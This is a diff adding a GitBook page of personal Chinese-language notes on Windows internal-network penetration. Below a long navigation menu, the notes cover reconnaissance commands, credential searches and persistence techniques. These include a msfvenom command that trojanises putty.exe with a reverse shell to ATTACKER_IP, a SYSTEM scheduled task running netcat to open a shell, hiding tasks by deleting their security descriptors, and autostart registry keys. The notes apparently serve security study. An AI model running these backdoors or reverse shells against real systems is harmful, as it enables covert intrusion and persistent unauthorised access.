+                <a href="../../03.代码审计/JAVA/02.基础漏洞/模板注入.html">
+            
+                    
+                    模板注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.4" data-path="../../03.代码审计/JAVA/02.基础漏洞/表达式注入.html">
+            
+                <a href="../../03.代码审计/JAVA/02.基础漏洞/表达式注入.html">
+            
+                    
+                    表达式注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3" >
+            
+                <span>
+            
+                    
+                    03.JavaWeb了解
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.3.1" data-path="../../03.代码审计/JAVA/03.JavaWeb了解/Spring.html">
+            
+                <a href="../../03.代码审计/JAVA/03.JavaWeb了解/Spring.html">
+            
+                    
+                    Spring
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.2" data-path="../../03.代码审计/JAVA/03.JavaWeb了解/Struts2.html">
+            
+                <a href="../../03.代码审计/JAVA/03.JavaWeb了解/Struts2.html">
+            
+                    
+                    Struts 2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.3" data-path="../../03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html">
+            
+                <a href="../../03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html">
+            
+                    
+                    Tomcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4" >
+            
+                <span>
+            
+                    
+                    04.反序列化
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.1" >
+            
+                <span>
+            
+                    
+                    CC链
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.1.1" data-path="../../03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html">
+            
+                    
+                    JAVA反序列化之CC1--LazyMap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.1.2" data-path="../../03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html">
+            
+                    
+                    Java反序列化之CC1-TransFormed
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.1.3" data-path="../../03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html">
+            
+                    
+                    Java反序列化之URLDNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.2" data-path="../../03.代码审计/JAVA/04.反序列化/FastJson.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/FastJson.html">
+            
+                    
+                    Fastjson漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.3" data-path="../../03.代码审计/JAVA/04.反序列化/JNDI.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/JNDI.html">
+            
+                    
+                    JNDI注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.5" data-path="../../03.代码审计/JAVA/Java-Thymeleaf模板注入.html">
+            
+                <a href="../../03.代码审计/JAVA/Java-Thymeleaf模板注入.html">
+            
+                    
+                    Thymeleaf 模板注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.6" data-path="../../03.代码审计/JAVA/JavaAttack.html">
+            
+                <a href="../../03.代码审计/JAVA/JavaAttack.html">
+            
+                    
+                    Java Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7" data-path="../../03.代码审计/JAVA/Java代审--常见漏洞函数.html">
+            
+                <a href="../../03.代码审计/JAVA/Java代审--常见漏洞函数.html">
+            
+                    
+                    Java代码审计--常见漏洞函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.1" data-path="../../03.代码审计/PHP/phpinfo.html">
+            
+                <a href="../../03.代码审计/PHP/phpinfo.html">
+            
+                    
+                    phpinfo中的信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.2" data-path="../../03.代码审计/PHP/PHP代码审计.html">
+            
+                <a href="../../03.代码审计/PHP/PHP代码审计.html">
+            
+                    
+                    PHP代码审计
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.3" data-path="../../03.代码审计/PHP/php代码审计基础.html">
+            
+                <a href="../../03.代码审计/PHP/php代码审计基础.html">
+            
+                    
+                    PHP代码审计基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.4" data-path="../../03.代码审计/PHP/php反序列化.html">
+            
+                <a href="../../03.代码审计/PHP/php反序列化.html">
+            
+                    
+                    PHP反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../../03.代码审计/python反序列化.html">
+            
+                <a href="../../03.代码审计/python反序列化.html">
+            
+                    
+                    Python反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    04.工具使用
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../04.工具使用/00.注意.html">
+            
+                <a href="../../04.工具使用/00.注意.html">
+            
+                    
+                    00.注意
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../04.工具使用/01.Cobal%20Strike.md">
+            
+                <span>
+            
+                    
+                    01.Cobal Strike
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../04.工具使用/02.MSF.html">
+            
+                <a href="../../04.工具使用/02.MSF.html">
+            
+                    
+                    02.MSF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../../04.工具使用/03.抓包工具.html">
+            
+                <a href="../../04.工具使用/03.抓包工具.html">
+            
+                    
+                    03.抓包工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../../04.工具使用/04.gogo.html">
+            
+                <a href="../../04.工具使用/04.gogo.html">
+            
+                    
+                    04.gogo
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../../04.工具使用/05.辅助工具.html">
+            
+                <a href="../../04.工具使用/05.辅助工具.html">
+            
+                    
+                    05.辅助工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    05.编程开发
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" >
+            
+                <span>
+            
+                    
+                    Python
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1.1" data-path="../../05.编程开发/Python/POC模板.html">
+            
+                <a href="../../05.编程开发/Python/POC模板.html">
+            
+                    
+                    POC编写
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.1.2" data-path="../../05.编程开发/Python/python命名空间.html">
+            
+                <a href="../../05.编程开发/Python/python命名空间.html">
+            
+                    
+                    python命名空间
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.1.3" data-path="../../05.编程开发/Python/python技巧.html">
+            
+                <a href="../../05.编程开发/Python/python技巧.html">
+            
+                    
+                    python技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" >
+            
+                <span>
+            
+                    
+                    工具原理
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.2.1" data-path="../../05.编程开发/工具原理/sqlmap.html">
+            
+                <a href="../../05.编程开发/工具原理/sqlmap.html">
+            
+                    
+                    Sqlmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../../05.编程开发/Nginx.html">
+            
+                <a href="../../05.编程开发/Nginx.html">
+            
+                    
+                    Nginx
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    06.WriteUp
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" >
+            
+                <span>
+            
+                    
+                    CTF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1.1" data-path="../../06.WriteUp/CTF/2022安洵杯.html">
+            
+                <a href="../../06.WriteUp/CTF/2022安洵杯.html">
+            
+                    
+                    2022 安洵杯
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.2" data-path="../../06.WriteUp/CTF/bugku应急响应.html">
+            
+                <a href="../../06.WriteUp/CTF/bugku应急响应.html">
+            
+                    
+                    bugku 应急响应
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.3" data-path="../../06.WriteUp/CTF/BUU.md">
+            
+                <span>
+            
+                    
+                    BUUCTF刷题合集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.4" data-path="../../06.WriteUp/CTF/HNCTF.html">
+            
+                <a href="../../06.WriteUp/CTF/HNCTF.html">
+            
+                    
+                    HNCTF 2022
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.5" data-path="../../06.WriteUp/CTF/misc.html">
+            
+                <a href="../../06.WriteUp/CTF/misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.6" data-path="../../06.WriteUp/CTF/NewstarCTF.html">
+            
+                <a href="../../06.WriteUp/CTF/NewstarCTF.html">
+            
+                    
+                    New Star CTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.7" data-path="../../06.WriteUp/CTF/NodeJs.html">
+            
+                <a href="../../06.WriteUp/CTF/NodeJs.html">
+            
+                    
+                    NodeJs相关
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.8" data-path="../../06.WriteUp/CTF/NSSRound5.html">
+            
+                <a href="../../06.WriteUp/CTF/NSSRound5.html">
+            
+                    
+                    NSS Round 5
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.9" data-path="../../06.WriteUp/CTF/NSSRound6.html">
+            
+                <a href="../../06.WriteUp/CTF/NSSRound6.html">
+            
+                    
+                    NSS Round 6
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.10" data-path="../../06.WriteUp/CTF/环境变量注入.html">
+            
+                <a href="../../06.WriteUp/CTF/环境变量注入.html">
+            
+                    
+                    环境变量注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" >
+            
+                <span>
+            
+                    
+                    靶机
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.2.1" data-path="../../06.WriteUp/靶机/HackTheBox--Alert.html">
+            
+                <a href="../../06.WriteUp/靶机/HackTheBox--Alert.html">
+            
+                    
+                    Hack The Box Alert
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.2" data-path="../../06.WriteUp/靶机/Vulnhub-blue系列.html">
+            
+                <a href="../../06.WriteUp/靶机/Vulnhub-blue系列.html">
+            
+                    
+                    Vulnhub--blue系列
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.3" data-path="../../06.WriteUp/靶机/Vulnhub-DC系列.html">
+            
+                <a href="../../06.WriteUp/靶机/Vulnhub-DC系列.html">
+            
+                    
+                    Vulnhub--DC系列
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.4" data-path="../../06.WriteUp/靶机/红日靶场1.html">
+            
+                <a href="../../06.WriteUp/靶机/红日靶场1.html">
+            
+                    
+                    红日靶场1
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    07.基础知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1.1" data-path="../../07.基础知识/Linux/linux-shell.html">
+            
+                <a href="../../07.基础知识/Linux/linux-shell.html">
+            
+                    
+                    《Linux命令行与shell脚本编程大全》 笔记
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.1.2" data-path="../../07.基础知识/Linux/Linux命令.html">
+            
+                <a href="../../07.基础知识/Linux/Linux命令.html">
+            
+                    
+                    Linux常用命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.1.3" data-path="../../07.基础知识/Linux/Linux命令本质.html">
+            
+                <a href="../../07.基础知识/Linux/Linux命令本质.html">
+            
+                    
+                    Linux命令本质
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" >
+            
+                <span>
+            
+                    
+                    Windows
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.2.1" data-path="../../07.基础知识/Windows/windows基本操作.html">
+            
+                <a href="../../07.基础知识/Windows/windows基本操作.html">
+            
+                    
+                    windows基本操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" >
+            
+                <span>
+            
+                    
+                    计算机网络
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.3.1" data-path="../../07.基础知识/计算机网络/ARP协议.html">
+            
+                <a href="../../07.基础知识/计算机网络/ARP协议.html">
+            
+                    
+                    ARP协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.2" data-path="../../07.基础知识/计算机网络/DNS协议.html">
+            
+                <a href="../../07.基础知识/计算机网络/DNS协议.html">
+            
+                    
+                    DNS协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.3" data-path="../../07.基础知识/计算机网络/湖科大mooc.html">
+            
+                <a href="../../07.基础知识/计算机网络/湖科大mooc.html">
+            
+                    
+                    计算机网络MOOC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.4" data-path="../../07.基础知识/计算机网络/虚拟机网络.html">
+            
+                <a href="../../07.基础知识/计算机网络/虚拟机网络.html">
+            
+                    
+                    虚拟机网络
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../../07.基础知识/tombkeeper关于信息安全学习的分享.html">
+            
+                <a href="../../07.基础知识/tombkeeper关于信息安全学习的分享.html">
+            
+                    
+                    tombkeeper关于信息安全学习的分享
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../../07.基础知识/名词解释.html">
+            
+                <a href="../../07.基础知识/名词解释.html">
+            
+                    
+                    常见名词与概念
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../../07.基础知识/渗透测试和红队的区别.html">
+            
+                <a href="../../07.基础知识/渗透测试和红队的区别.html">
+            
+                    
+                    转载--渗透测试和红队的区别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../../07.基础知识/编码.html">
+            
+                <a href="../../07.基础知识/编码.html">
+            
+                    
+                    编码
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" >
+            
+                <span>
+            
+                    
+                    08.杂七杂八
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../../08.杂七杂八/个人信息保护.html">
+            
+                <a href="../../08.杂七杂八/个人信息保护.html">
+            
+                    
+                    个人信息保护
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../../08.杂七杂八/华为安装谷歌.html">
+            
+                <a href="../../08.杂七杂八/华为安装谷歌.html">
+            
+                    
+                    华为安装谷歌
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../../08.杂七杂八/安全方向.html">
+            
+                <a href="../../08.杂七杂八/安全方向.html">
+            
+                    
+                    安全方向
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.4" data-path="../../08.杂七杂八/手机VPN共享.html">
+            
+                <a href="../../08.杂七杂八/手机VPN共享.html">
+            
+                    
+                    手机VPN共享
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.5" data-path="../../08.杂七杂八/换内存条.html">
+            
+                <a href="../../08.杂七杂八/换内存条.html">
+            
+                    
+                    如何更换内存条
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.6" data-path="../../08.杂七杂八/面试记录.html">
+            
+                <a href="../../08.杂七杂八/面试记录.html">
+            
+                    
+                    笔/面记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+        </nav>
+        
+        
+    </div>
+
+    <!-- Content nav -->
+    <div class="book-anchor">
+        <div class="book-anchor-title">ON THIS PAGE</div>
+        <div class="book-anchor-body">
+
+        </div>
+    </div>
+
+    <div class="book-body">
+        
+        <div class="body-inner">
+            
+            
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Windows内网渗透</a>
+    </h1>
+</div>
+
+
+
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                    
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                    <section class="normal markdown-section">
+                        
+                        <h1 id="&#x4FE1;&#x606F;&#x6536;&#x96C6;">&#x4FE1;&#x606F;&#x6536;&#x96C6;</h1>
+<h2 id="&#x672C;&#x673A;&#x4FE1;&#x606F;&#x6536;&#x96C6;">&#x672C;&#x673A;&#x4FE1;&#x606F;&#x6536;&#x96C6;</h2>
+<pre class="language-"><code class="lang-cmd"># &#x7528;&#x6237;&#x5217;&#x8868;&#xFF1A;windows&#x7528;&#x6237;&#x5217;&#x8868; &#x5206;&#x6790;&#x90AE;&#x4EF6;&#x7528;&#x6237;&#xFF0C;&#x5185;&#x7F51;[&#x57DF;]&#x90AE;&#x4EF6;&#x7528;&#x6237;&#xFF0C;&#x901A;&#x5E38;&#x5C31;&#x662F;&#x5185;&#x7F51;[&#x57DF;]&#x7528;&#x6237;
+net user /domain
+
+# &#x8FDB;&#x7A0B;&#x5217;&#x8868;&#xFF1A;&#x5206;&#x6790;&#x6740;&#x6BD2;&#x8F6F;&#x4EF6;/&#x5B89;&#x5168;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x7B49; &#x90AE;&#x4EF6;&#x5BA2;&#x6237;&#x7AEF; VPN ftp&#x7B49;
+tasklist /svc
+
+# &#x7AEF;&#x53E3;&#x5217;&#x8868;&#xFF1A;&#x5F00;&#x653E;&#x7AEF;&#x53E3;&#x5BF9;&#x5E94;&#x7684;&#x5E38;&#x89C1;&#x670D;&#x52A1;/&#x5E94;&#x7528;&#x7A0B;&#x5E8F;[&#x533F;&#x540D;/&#x6743;&#x9650;/&#x6F0F;&#x6D1E;&#x7B49;] &#x5229;&#x7528;&#x7AEF;&#x53E3;&#x8FDB;&#x884C;&#x4FE1;&#x606F;&#x6536;&#x96C6;
+netstat -ano
+
+# &#x8865;&#x4E01;&#x5217;&#x8868;&#xFF1A;&#x5206;&#x6790; Windows &#x8865;&#x4E01; &#x7B2C;&#x4E09;&#x65B9;&#x8F6F;&#x4EF6;[Java/Oracle/Flash &#x7B49;]&#x6F0F;&#x6D1E;
+systeminfo
+
+# &#x672C;&#x673A;&#x5171;&#x4EAB;&#xFF1A;&#x672C;&#x673A;&#x5171;&#x4EAB;&#x5217;&#x8868;/&#x8BBF;&#x95EE;&#x6743;&#x9650; &#x672C;&#x673A;&#x8BBF;&#x95EE;&#x7684;&#x57DF;&#x5171;&#x4EAB;/&#x8BBF;&#x95EE;&#x6743;&#x9650;
+smbclient -L ip  
+net view \\ip
+
+# &#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF1A;&#x67E5;&#x770B;&#x5B89;&#x88C5;&#x7A0B;&#x5E8F;&#x548C;&#x7248;&#x672C;&#x4FE1;&#x606F;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x901A;&#x8BAF;&#x8F6F;&#x4EF6;&#xFF0C;&#x5404;&#x7C7B;&#x5BC6;&#x7801;&#x6536;&#x96C6;
+wmic product get name,version
+findstr /sim &apos;password&apos; *.txt *.xml *.docx *.php # &#x9012;&#x5F52;&#x641C;&#x7D22;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;
+</code></pre>
+<h2 id="&#x7F51;&#x7EDC;&#x62D3;&#x6251;&#x6536;&#x96C6;">&#x7F51;&#x7EDC;&#x62D3;&#x6251;&#x6536;&#x96C6;</h2>
+<pre class="language-"><code class="lang-cmd"># &#x7F51;&#x5361;
+ipconfig /all
+
+# &#x8DEF;&#x7531;
+route print
+
+# arp&#x7F13;&#x5B58;
+arp -a
+</code></pre>
+<h2 id="&#x57DF;&#x4FE1;&#x606F;&#x6536;&#x96C6;">&#x57DF;&#x4FE1;&#x606F;&#x6536;&#x96C6;</h2>
+<pre class="language-"><code class="lang-cmd">
+
+</code></pre>
+<h1 id="&#x6743;&#x9650;&#x7EF4;&#x6301;">&#x6743;&#x9650;&#x7EF4;&#x6301;</h1>
+<h2 id="&#x6DFB;&#x52A0;&#x540E;&#x95E8;&#x7528;&#x6237;">&#x6DFB;&#x52A0;&#x540E;&#x95E8;&#x7528;&#x6237;</h2>
+<h3 id="rid&#x52AB;&#x6301;">RID&#x52AB;&#x6301;</h3>
+<h2 id="&#x540E;&#x95E8;&#x6587;&#x4EF6;">&#x540E;&#x95E8;&#x6587;&#x4EF6;</h2>
+<h3 id="&#x7BE1;&#x6539;exe">&#x7BE1;&#x6539;exe</h3>
+<p>&#x901A;&#x8FC7;msf&#x5411;exe&#x4E2D;&#x690D;&#x5165;&#x8F7D;&#x8377;</p>
+<pre class="language-"><code class="lang-bash">msfvenom <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> windows <span class="token parameter variable">-x</span> putty.exe <span class="token parameter variable">-k</span> <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-b</span> <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span>&quot;</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> puttyX.exe
+</code></pre>
+<p>&#x5B9E;&#x9A8C;&#x5931;&#x8D25;</p>
+<h3 id="&#x7BE1;&#x6539;&#x5FEB;&#x6377;&#x65B9;&#x5F0F;">&#x7BE1;&#x6539;&#x5FEB;&#x6377;&#x65B9;&#x5F0F;</h3>
+<p>&#x5C06;&#x5FEB;&#x6377;&#x65B9;&#x5F0F;&#x7684;&#x5C5E;&#x6027;&#x503C;&#x6307;&#x5411;&#x6076;&#x610F;&#x6587;&#x4EF6;</p>
+<pre class="language-"><code class="lang-cmd">powershell.exe -WindowStyle hidden C:\Users\khaz\Desktop\calc.ps1
+</code></pre>
+<p><img src="E:/blog/source/images/image-20231117105520136.png" alt="image-20231117105520136"></p>
+<p>&#x4F46;&#x662F;powershel&#x7A97;&#x53E3;&#x4F1A;&#x4E00;&#x95EA;&#x800C;&#x8FC7;</p>
+<h3 id="&#x52AB;&#x6301;&#x6587;&#x4EF6;&#x5173;&#x8054;">&#x52AB;&#x6301;&#x6587;&#x4EF6;&#x5173;&#x8054;</h3>
+<h3 id="&#x521B;&#x5EFA;windows-&#x4EFB;&#x52A1;&#x8BA1;&#x5212;&#x7A0B;&#x5E8F;">&#x521B;&#x5EFA;<strong>Windows &#x4EFB;&#x52A1;&#x8BA1;&#x5212;&#x7A0B;&#x5E8F;</strong></h3>
+<pre class="language-"><code class="lang-cmd"># &#x521B;&#x5EFA;&#x4EFB;&#x52A1;&#x8BA1;&#x5212;
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr &quot;c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449&quot; /ru SYSTEM
+</code></pre>
+<blockquote>
+<p>/sc minute /mo 1&#xFF1A;&#x4E00;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;</p>
+<p>/tn  <name>&#xFF1A;&#x4EFB;&#x52A1;&#x8BA1;&#x5212;&#x540D;&#x79F0;</name></p>
+<p>/tr <cmd>&#xFF1A;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;</cmd></p>
+<p>/ru <user>&#xFF1A;&#x4EE5;&#x4EC0;&#x4E48;&#x6743;&#x9650;&#x8FD0;&#x884C;</user></p>
+</blockquote>
+<pre class="language-"><code class="lang-cmd"># &#x67E5;&#x8BE2;&#x4EFB;&#x52A1;&#x8BA1;&#x5212;
+schtasks /query
+</code></pre>
+<p>&#x9690;&#x85CF;&#x4EFB;&#x52A1;&#x8BA1;&#x5212;</p>
+<blockquote>
+<p><strong>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5220;&#x9664;&#x5176;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#xFF08;SD&#xFF09;</strong>&#x4F7F;&#x4EFB;&#x52A1;&#x8BA1;&#x5212;&#x5BF9;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x7528;&#x6237;&#x4E0D;&#x53EF;&#x89C1;&#x3002;</p>
+<p>&#x6240;&#x6709;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x7684;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#x90FD;&#x5B58;&#x50A8;&#x5728;<code>&#x8BA1;&#x7B97;&#x673A;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code>&#x4E2D;&#x540D;&#x4E3A;&#x201C;SD&#x201D;&#x7684;&#x503C;</p>
+</blockquote>
+<p><img src="E:/blog/source/images/image-20231117111429781.png" alt="image-20231117111429781"></p>
+<h3 id="&#x6DFB;&#x52A0;&#x81EA;&#x542F;&#x52A8;&#x9879;">&#x6DFB;&#x52A0;&#x81EA;&#x542F;&#x52A8;&#x9879;</h3>
+<p>&#x542F;&#x52A8;&#x9879;&#x76EE;&#x5F55;</p>
+<pre class="language-"><code class="lang-cmd"># &#x7279;&#x5B9A;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65F6;
+C:\Users\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>your_username</span><span class="token punctuation">&gt;</span></span>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+# &#x4EFB;&#x610F;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65F6;
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+</code></pre>
+<p>&#x6CE8;&#x518C;&#x8868;&#x542F;&#x52A8;&#x9879;</p>
+<pre class="language-"><code class="lang-cmd"># &#x5F53;&#x524D;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65F6;
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+# &#x4EFB;&#x610F;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65F6;
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+</code></pre>
+<p>&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x503C;</p>
